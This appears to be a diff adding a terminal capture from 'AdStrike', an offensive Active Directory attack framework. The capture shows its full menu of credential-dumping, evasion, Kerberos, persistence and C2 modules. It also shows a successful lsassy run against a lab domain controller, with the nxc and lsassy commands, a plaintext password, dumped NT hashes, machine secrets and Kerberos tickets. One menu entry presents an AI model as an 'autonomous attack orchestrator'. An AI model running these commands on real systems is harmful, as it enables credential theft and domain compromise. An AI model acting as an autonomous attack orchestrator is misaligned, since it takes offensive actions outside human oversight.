@@ -1,0 +1,276 @@
+
+╭━━━┳━━━╮╱╱╭━━━┳━━━━┳━━━┳━━┳╮╭━┳━━━╮
+┃╭━╮┣╮╭╮┃╱╱┃╭━╮┃╭╮╭╮┃╭━╮┣┫┣┫┃┃╭┫╭━━╯
+┃┃╱┃┃┃┃┃┃╱╱┃╰━━╋╯┃┃╰┫╰━╯┃┃┃┃╰╯╯┃╰━━╮
+┃╰━╯┃┃┃┃┣━━╋━━╮┃╱┃┃╱┃╭╮╭╯┃┃┃╭╮┃┃╭━━╯
+┃╭━╮┣╯╰╯┣━━┫╰━╯┃╱┃┃╱┃┃┃╰┳┫┣┫┃┃╰┫╰━━╮
+╰╯╱╰┻━━━╯╱╱╰━━━╯╱╰╯╱╰╯╰━┻━━┻╯╰━┻━━━╯
+────────────────────────────────────────────────────────────────────────────────────
+  ACTIVE DIRECTORY STRIKE FRAMEWORK  |  v5.0 «AdStrike»  |  build 2026.04
+  56 menu entries  |  8 guided phases  |  AI operator  |  reports  |  creator: tmrswrr
+  [!]  Authorised penetration testing and red-team engagements only
+────────────────────────────────────────────────────────────────────────────────────
+
+┌────────────────────────────────────────────────────────────────────────────────────────────────┐
+│  TARGET  twright@hackerblueprint.local  ▶  192.168.189.10  │  AUTH   ✓ PASSWORD                │
+│  ENGAGE  hackerblueprint-lab                    │  STATS  0 cmd  |  0 findings  |  0u/0m owned │
+└────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+  Quick path: [57] Session -> [58] Tool Checker -> [10] Enum -> [53] AI Agent -> [56] Report
+
+    PHASE 0  RECONNAISSANCE  ───────────────────────────────────────────────
+    [ 1]  Recon & OSINT                     DNS · WHOIS · email harvest · crt.sh
+    [ 2]  Network Discovery                 nmap · masscan · nbtscan · IPv6
+
+    PHASE 1  INITIAL ACCESS  ───────────────────────────────────────────────
+    [ 3]  Initial Access (No Creds)         NTLM capture · relay · ARP · DHCPv6 · RID
+    [ 4]  CVE / AD Exploits                 NoPac · PrintNightmare · Zerologon
+    [ 5]  AMSI / Defense Evasion            AMSI bypass · CLM · AppLocker · Codecepticon
+    [ 6]  EDR / AV Evasion                  NanoDump+MockingJay · RWXfinder · BOF · syscalls
+    [ 7]  UAC Bypass                        fodhelper · eventvwr · CMSTP · token
+    [ 8]  Pre2K & Timeroasting              Pre-Win2K accounts · MS-SNTP hash · MAQ abuse
+    [ 9]  WSUS Attack                       WSUS HTTP spoof · pywsus · SYSTEM code exec
+
+    PHASE 2  ENUMERATION  ──────────────────────────────────────────────────
+    [10]  AD Enumeration                    LDAP · SMB · GPO · DNS · Trust · SPN · LAPS
+    [11]  PowerView Enumeration             Full PowerView cmdlet reference
+    [12]  BloodHound Helper                 SOAPHound · RustHound · ADExplorer · Neo4j
+    [13]  File & Share Hunter               Snaffler · SYSVOL · GPP · spider_plus
+    [14]  NetExec / NXC Suite               nxc smb · ldap · mssql · winrm · rdp
+    [15]  User Hunting                      SessionHunter · UserHunter · NetCease bypass
+    [16]  ADIDNS Abuse                      Wildcard DNS · WPAD · record inject · DNSAdmins
+
+    PHASE 3  PRIVILEGE ESCALATION  ─────────────────────────────────────────
+    [17]  Local Privilege Escalation        PowerUp · KrbRelayUp · Potatoes · JEA
+    [18]  Kerberos Attacks                  Golden · Silver · Diamond · Sapphire · Roast
+    [19]  Rubeus Toolkit                    TGT · TGS · Roast · PTT · S4U · monitor
+    [20]  Shadow Credentials                msDS-KeyCredentialLink · PKINIT
+    [21]  RBCD Full Chain                   Powermad · S4U2Proxy · /altservice · Bronze Bit
+    [22]  ACL / ACE Abuse                   GenericAll · WriteDACL · ForceChange
+    [23]  Certificate Abuse (ADCS)          ESC1–ESC13 · certipy · CertSync
+    [24]  RODC Attacks                      PRP abuse · Key List · RODC Golden Ticket
+    [25]  Golden Certificate                ESC13/14/15/16 · CA key theft · UnPAC · PassTheCert
+    [26]  UnPAC / PassTheCert               Targeted Kerberoast · UnPAC · PassTheCert · SPN-Jack
+    [27]  JEA Attacks                       JEA bypass · PSReadLine history · CLM escape
+
+    PHASE 4  LATERAL MOVEMENT  ─────────────────────────────────────────────
+    [28]  Lateral Movement                  PSExec · WMI · DCOM · Evil-WinRM · WinRS
+    [29]  Coercion Attacks                  PrinterBug · PetitPotam · Relay→ShadowCreds
+    [30]  MSSQL Abuse                       xp_cmdshell · PowerUpSQL · linked server RCE
+    [31]  Password Attacks                  Spray · kerbrute · stuffing · relay
+    [32]  SCCM / MECM Abuse                 NAA · relay · push · AdminService
+
+    PHASE 5  CREDENTIAL ACCESS  ────────────────────────────────────────────
+    [33]  Credential Dumping                LSASS · SAM · NTDS · lsassy · nanodump
+    [34]  DPAPI & Credential Vault          dploot bulk · SharpDPAPI · LaZagne · KeeThief
+    [35]  DCSync / DCShadow                 Full domain hash dump · rogue DC
+    [36]  Shadow Copies Abuse               VSS · NTDS.dit · SAM · SYSTEM extract
+
+    PHASE 6  PERSISTENCE  ──────────────────────────────────────────────────
+    [37]  Domain Persistence                Golden · AdminSDHolder · NPPSPY · TTL group
+    [38]  Local Persistence                 SharPersist · WMI · Registry · Startup
+    [39]  GPO Abuse                         GPO create · link · exec · hijack · logon
+    [40]  DNSAdmins Abuse                   DLL injection via DNS service
+    [41]  Trust Attacks                     TrustKey · SIDHistoryDC · PAM · Multi-Hop
+    [42]  AD Misc Abuse                     BackupOps · Skeleton Key · Exchange
+
+    PHASE 7  CLOUD / HYBRID  ───────────────────────────────────────────────
+    [43]  Azure AD / Entra ID               AADConnect · PTA · PHS · PRT · token
+    [44]  Entra Hybrid Attacks              MSOL DCSync · adconnect.ps1 · DeviceCode · PTA
+    [45]  gMSA Attacks                      Enum · extract · PTH · shadow-creds · DSInternals
+    [46]  ADFS & Golden SAML                Token signing cert · Golden SAML · AADInternals
+    [47]  AiTM / MFA Bypass                 Evilginx2 · MFA fatigue · cookie replay · hybrid pivot
+    [48]  M365 / Teams Attacks              MailSniper · Graph API · Teams phishing · Intune abuse
+
+    PHASE 8  ADVANCED OPERATIONS  ──────────────────────────────────────────
+    [49]  Exploit Chains                    8 pre-built full-DA attack paths
+    [50]  C2 Integration                    Sliver · Havoc · MSF · CS payload delivery
+    [51]  Loot Parser & Analyzer            Parse · dedup · score · export creds
+    [52]  AD Advanced Playbook              WDAC · MDE/MDI · WMI filters · trusts · deception
+
+    UTILITIES  ─────────────────────────────────────────────────────────────
+    [53]  AdStrike Agent (AI)               Claude AI · autonomous attack orchestrator · all modules
+    [54]  Smart Analyst                     Parse outputs · build attack plan · auto-execute
+    [55]  Kerberos Manager                  TGT · PTT · S4U · ccache · krb5.conf
+    [56]  Generate Report                   HTML · Markdown · JSON pentest report
+    [57]  Session Manager                   Save · load · switch · clear sessions
+    [58]  Tool Checker                      Verify all 45+ required offensive tools
+    [ 0]  Exit                              Save session & quit
+
+
+  ┌─[AdStrike]─[v5.0]
+  └──▶ 
+  ╔═══════════════════════════════════════════════════╗
+  ║                CREDENTIAL DUMPING                 ║
+  ╠═══════════════════════════════════════════════════╣
+  ║    LSASS · SAM · NTDS · Mimikatz · Invoke-Mimi    ║
+  ╚═══════════════════════════════════════════════════╝
+
+  [auto] Target IP             : 192.168.189.10
+  [auto] Domain                : hackerblueprint.local
+  [auto] Username              : twright
+  [auto] Password              : ***
+
+  ── REMOTE (LINUX / IMPACKET) ────────────────────────────────────────────────
+  [1]  SAM + SYSTEM           (remote registry)
+  [2]  NTDS.dit DCSync        (all domain hashes)
+  [3]  LSASS via lsassy       (no binary drop)
+  [4]  LSA Secrets
+  [5]  Full secretsdump
+  [6]  LAPS Passwords via NXC
+
+  ── MIMIKATZ (Windows side) ──────────────────────────────────────────────────
+  [7]  sekurlsa::logonpasswords     (NTLM hashes + plaintext)
+  [8]  sekurlsa::ekeys              (AES128/AES256 keys — CRTP)
+  [9]  sekurlsa::pth                (Pass-the-Hash spawn)
+  [10] lsadump::lsa /patch          (local SAM hashes)
+  [11] lsadump::dcsync              (DCSync via Mimikatz)
+
+  ── INVOKE-MIMI (PowerShell in-memory — CRTP) ────────────────────────────────
+  [12] Invoke-Mimi cheat sheet      (all key commands)
+  [13] Invoke-Mimi DCSync           (krbtgt + Administrator hash)
+  [14] Invoke-Mimi Vault            (token::elevate + vault::cred /patch)
+
+  [0]  Back
+
+  Choice: SMB                      192.168.189.10  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hackerblueprint.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB                      192.168.189.10  445    DC01             [+] hackerblueprint.local\twright:NewPass1234! (Pwn3d!)
+LSASSY                   192.168.189.10  445    DC01             [+] Saved 23 Kerberos ticket(s) to /home/b3t4m3/.nxc/modules/lsassy
+LSASSY                   192.168.189.10  445    DC01             HACKERBLUEPRINT\Administrator c0ced2de918b4a7c1b9f4efd225dd503
+192.168.189.10 - HACKERBLUEPRINT\Administrator               [NT] c0ced2de918b4a7c1b9f4efd225dd503 | [SHA1] c03ca9fdf5123291ef4b93ecb37c9c9e1fb6d4d5
+192.168.189.10 - HACKERBLUEPRINT\DC01$                       [NT] f28c3d8b01bb7a005678d88252db2eb6 | [SHA1] 649291cade4d63b731d9f56085816ce685b49007
+192.168.189.10 - hackerblueprint.local\DC01$                 [PWD] d55c2107c0b0bd29d4fb3fda753962b38d02d950fdf6f362a4956fcf348e1f8c489fd3c5eb8ad69356874455d71e28b4db5541a9b180bf5397d9817036e140ddadfa0cb49f63b395feefd93a0f92bc4a2c81831be4282e3bd679d0580af9ea6f79b74a925fb2d724ca9c3f8f9ea0d20bc4dacde0f241dd852f0e8fcfea2ce3d5ada71c2417dd6052d69e5274e79201bb2430091e3c32de7e9723e2af0d2565472246e7462324820495100a3cf8a9ae5c733705fbadc1e822aeb3758ee6a1136118c8398b7cf9f8fafd612639486492528ccff63dc2da5bdd08fd252bf5b47bf29d8e17b4b515bee87e8768ad6ba09b18
+192.168.189.10 - HACKERBLUEPRINT\DC01$                       [NT] 4bfbe069a8ac8404654f3adf3b39de05 | [SHA1] f776a36eb9ffb937e9119a3b805382ec89a89a0e
+192.168.189.10 - hackerblueprint.local\DC01$                 [PWD] 02a5c93ac2f3f669b82cc6d8aef9c9c1bc8dbad48029d56e61ca18fc0246711e55a7726b3337b648cb693326b42708613e7a8789522265ffbf35c1275aacb38428d41f429d59463654bd963db9aa7645c81004a42b9648b9340d165ad0bbb1969df52f97e03f3ae54a7e95fd42ed025be4c3c46705bc2f083596db37c660e533d71bd63595faa95454490250356c1c62f22039d7d11ce77050813b67b7a11044db03bf6ace49ea4cb5444ecb593834334d5b4a60a217ec483305451a7f786744f47d5a65f76bd88b04f89b7c87618d8b9e2b5bfd45f782aa39d0385ef6b3dc7bf57d0119725fe6922dad3bbe8a6c9786
+192.168.189.10 - HACKERBLUEPRINT.LOCAL\DC01$                 [TGT] Domain: HACKERBLUEPRINT.LOCAL - End time: 2026-06-09 23:56 (TGT_HACKERBLUEPRINT.LOCAL_DC01$_krbtgt_HACKERBLUEPRINT.LOCAL_4ba4aaf0_20260609235632.ccache)
+192.168.189.10 - HACKERBLUEPRINT.LOCAL\DC01$                 [TGT] Domain: HACKERBLUEPRINT.LOCAL - End time: 2026-06-09 23:56 (TGT_HACKERBLUEPRINT.LOCAL_DC01$_krbtgt_HACKERBLUEPRINT.LOCAL_74567ec1_20260609235632.ccache)
+192.168.189.10 - HACKERBLUEPRINT.LOCAL\DC01$                 [TGT] Domain: HACKERBLUEPRINT.LOCAL - End time: 2026-06-09 23:56 (TGT_HACKERBLUEPRINT.LOCAL_DC01$_krbtgt_HACKERBLUEPRINT.LOCAL_c2265037_20260609235632.ccache)
+23 Kerberos tickets written to /home/b3t4m3/.config/lsassy/tickets
+4 masterkeys saved to /home/b3t4m3/.config/lsassy/masterkeys.txt
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ nxc smb 192.168.189.10 -u 'twright' -p 'NewPass1234!' -d hackerblueprint.local -M lsassy
+  └──────────────────────────────────────────────────
+
+  ┌─[ CMD ]─────────────────────────────────────────
+  │ lsassy -d hackerblueprint.local -u 'twright' -p 'NewPass1234!' 192.168.189.10
+  └──────────────────────────────────────────────────
+  [Enter] to return
+
+╭━━━┳━━━╮╱╱╭━━━┳━━━━┳━━━┳━━┳╮╭━┳━━━╮
+┃╭━╮┣╮╭╮┃╱╱┃╭━╮┃╭╮╭╮┃╭━╮┣┫┣┫┃┃╭┫╭━━╯
+┃┃╱┃┃┃┃┃┃╱╱┃╰━━╋╯┃┃╰┫╰━╯┃┃┃┃╰╯╯┃╰━━╮
+┃╰━╯┃┃┃┃┣━━╋━━╮┃╱┃┃╱┃╭╮╭╯┃┃┃╭╮┃┃╭━━╯
+┃╭━╮┣╯╰╯┣━━┫╰━╯┃╱┃┃╱┃┃┃╰┳┫┣┫┃┃╰┫╰━━╮
+╰╯╱╰┻━━━╯╱╱╰━━━╯╱╰╯╱╰╯╰━┻━━┻╯╰━┻━━━╯
+────────────────────────────────────────────────────────────────────────────────────
+  ACTIVE DIRECTORY STRIKE FRAMEWORK  |  v5.0 «AdStrike»  |  build 2026.04
+  56 menu entries  |  8 guided phases  |  AI operator  |  reports  |  creator: tmrswrr
+  [!]  Authorised penetration testing and red-team engagements only
+────────────────────────────────────────────────────────────────────────────────────
+
+┌────────────────────────────────────────────────────────────────────────────────────────────────┐
+│  TARGET  twright@hackerblueprint.local  ▶  192.168.189.10  │  AUTH   ✓ PASSWORD                │
+│  ENGAGE  hackerblueprint-lab                    │  STATS  2 cmd  |  0 findings  |  0u/0m owned │
+└────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+  Quick path: [57] Session -> [58] Tool Checker -> [10] Enum -> [53] AI Agent -> [56] Report
+
+    PHASE 0  RECONNAISSANCE  ───────────────────────────────────────────────
+    [ 1]  Recon & OSINT                     DNS · WHOIS · email harvest · crt.sh
+    [ 2]  Network Discovery                 nmap · masscan · nbtscan · IPv6
+
+    PHASE 1  INITIAL ACCESS  ───────────────────────────────────────────────
+    [ 3]  Initial Access (No Creds)         NTLM capture · relay · ARP · DHCPv6 · RID
+    [ 4]  CVE / AD Exploits                 NoPac · PrintNightmare · Zerologon
+    [ 5]  AMSI / Defense Evasion            AMSI bypass · CLM · AppLocker · Codecepticon
+    [ 6]  EDR / AV Evasion                  NanoDump+MockingJay · RWXfinder · BOF · syscalls
+    [ 7]  UAC Bypass                        fodhelper · eventvwr · CMSTP · token
+    [ 8]  Pre2K & Timeroasting              Pre-Win2K accounts · MS-SNTP hash · MAQ abuse
+    [ 9]  WSUS Attack                       WSUS HTTP spoof · pywsus · SYSTEM code exec
+
+    PHASE 2  ENUMERATION  ──────────────────────────────────────────────────
+    [10]  AD Enumeration                    LDAP · SMB · GPO · DNS · Trust · SPN · LAPS
+    [11]  PowerView Enumeration             Full PowerView cmdlet reference
+    [12]  BloodHound Helper                 SOAPHound · RustHound · ADExplorer · Neo4j
+    [13]  File & Share Hunter               Snaffler · SYSVOL · GPP · spider_plus
+    [14]  NetExec / NXC Suite               nxc smb · ldap · mssql · winrm · rdp
+    [15]  User Hunting                      SessionHunter · UserHunter · NetCease bypass
+    [16]  ADIDNS Abuse                      Wildcard DNS · WPAD · record inject · DNSAdmins
+
+    PHASE 3  PRIVILEGE ESCALATION  ─────────────────────────────────────────
+    [17]  Local Privilege Escalation        PowerUp · KrbRelayUp · Potatoes · JEA
+    [18]  Kerberos Attacks                  Golden · Silver · Diamond · Sapphire · Roast
+    [19]  Rubeus Toolkit                    TGT · TGS · Roast · PTT · S4U · monitor
+    [20]  Shadow Credentials                msDS-KeyCredentialLink · PKINIT
+    [21]  RBCD Full Chain                   Powermad · S4U2Proxy · /altservice · Bronze Bit
+    [22]  ACL / ACE Abuse                   GenericAll · WriteDACL · ForceChange
+    [23]  Certificate Abuse (ADCS)          ESC1–ESC13 · certipy · CertSync
+    [24]  RODC Attacks                      PRP abuse · Key List · RODC Golden Ticket
+    [25]  Golden Certificate                ESC13/14/15/16 · CA key theft · UnPAC · PassTheCert
+    [26]  UnPAC / PassTheCert               Targeted Kerberoast · UnPAC · PassTheCert · SPN-Jack
+    [27]  JEA Attacks                       JEA bypass · PSReadLine history · CLM escape
+
+    PHASE 4  LATERAL MOVEMENT  ─────────────────────────────────────────────
+    [28]  Lateral Movement                  PSExec · WMI · DCOM · Evil-WinRM · WinRS
+    [29]  Coercion Attacks                  PrinterBug · PetitPotam · Relay→ShadowCreds
+    [30]  MSSQL Abuse                       xp_cmdshell · PowerUpSQL · linked server RCE
+    [31]  Password Attacks                  Spray · kerbrute · stuffing · relay
+    [32]  SCCM / MECM Abuse                 NAA · relay · push · AdminService
+
+    PHASE 5  CREDENTIAL ACCESS  ────────────────────────────────────────────
+    [33]  Credential Dumping                LSASS · SAM · NTDS · lsassy · nanodump
+    [34]  DPAPI & Credential Vault          dploot bulk · SharpDPAPI · LaZagne · KeeThief
+    [35]  DCSync / DCShadow                 Full domain hash dump · rogue DC
+    [36]  Shadow Copies Abuse               VSS · NTDS.dit · SAM · SYSTEM extract
+
+    PHASE 6  PERSISTENCE  ──────────────────────────────────────────────────
+    [37]  Domain Persistence                Golden · AdminSDHolder · NPPSPY · TTL group
+    [38]  Local Persistence                 SharPersist · WMI · Registry · Startup
+    [39]  GPO Abuse                         GPO create · link · exec · hijack · logon
+    [40]  DNSAdmins Abuse                   DLL injection via DNS service
+    [41]  Trust Attacks                     TrustKey · SIDHistoryDC · PAM · Multi-Hop
+    [42]  AD Misc Abuse                     BackupOps · Skeleton Key · Exchange
+
+    PHASE 7  CLOUD / HYBRID  ───────────────────────────────────────────────
+    [43]  Azure AD / Entra ID               AADConnect · PTA · PHS · PRT · token
+    [44]  Entra Hybrid Attacks              MSOL DCSync · adconnect.ps1 · DeviceCode · PTA
+    [45]  gMSA Attacks                      Enum · extract · PTH · shadow-creds · DSInternals
+    [46]  ADFS & Golden SAML                Token signing cert · Golden SAML · AADInternals
+    [47]  AiTM / MFA Bypass                 Evilginx2 · MFA fatigue · cookie replay · hybrid pivot
+    [48]  M365 / Teams Attacks              MailSniper · Graph API · Teams phishing · Intune abuse
+
+    PHASE 8  ADVANCED OPERATIONS  ──────────────────────────────────────────
+    [49]  Exploit Chains                    8 pre-built full-DA attack paths
+    [50]  C2 Integration                    Sliver · Havoc · MSF · CS payload delivery
+    [51]  Loot Parser & Analyzer            Parse · dedup · score · export creds
+    [52]  AD Advanced Playbook              WDAC · MDE/MDI · WMI filters · trusts · deception
+
+    UTILITIES  ─────────────────────────────────────────────────────────────
+    [53]  AdStrike Agent (AI)               Claude AI · autonomous attack orchestrator · all modules
+    [54]  Smart Analyst                     Parse outputs · build attack plan · auto-execute
+    [55]  Kerberos Manager                  TGT · PTT · S4U · ccache · krb5.conf
+    [56]  Generate Report                   HTML · Markdown · JSON pentest report
+    [57]  Session Manager                   Save · load · switch · clear sessions
+    [58]  Tool Checker                      Verify all 45+ required offensive tools
+    [ 0]  Exit                              Save session & quit
+
+
+  ┌─[AdStrike]─[v5.0]
+  └──▶ 
+  ╔═══════════════════════╗
+  ║    SESSION MANAGER    ║
+  ╚═══════════════════════╝
+
+
+  [1] Show current session
+  [2] Save session to file
+  [3] Load session from file
+  [4] Clear credentials
+  [5] Edit credentials
+  [0] Back
+
+  Choice: 
+  [?] DC IP [192.168.189.10] (Enter to keep):   [?] Domain [hackerblueprint.local] (Enter to keep):   [?] Username [twright] (Enter to keep):   [?] Password (Enter to keep):   [?] NT Hash (Enter to keep):   [?] Attacker IP [192.168.189.128] (Enter to keep):   [+] Credentials updated
+
+  [Enter] to return...
